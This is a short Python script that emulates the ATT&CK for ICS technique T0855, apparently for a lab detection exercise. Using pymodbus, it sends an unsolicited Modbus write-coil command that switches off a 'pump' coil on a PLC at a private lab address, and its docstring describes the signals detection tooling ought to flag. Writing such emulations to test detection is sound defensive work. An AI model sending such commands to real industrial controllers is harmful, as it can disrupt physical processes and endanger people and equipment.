#!/usr/bin/env python3
"""
ATT&CK for ICS T0855 - Unauthorized Command Message

Sends a single, unsolicited coil write from a host that should only ever
be read from (the attacker never polls). In a real network this is the
textbook "someone who isn't the HMI just turned off the pump" event.
Detection should flag: write from a non-engineering-station source IP,
or a write with no preceding poll pattern from that source.
"""
from pymodbus.client import ModbusTcpClient

PLC_HOST = "172.20.0.10"
PLC_PORT = 502

client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
if client.connect():
    # function code 0x05 - write single coil; flip CO0 ("pump") OFF
    rr = client.write_coil(0, False)
    print(f"write_coil(0, False) -> {rr}")
    client.close()
else:
    print("connection failed")
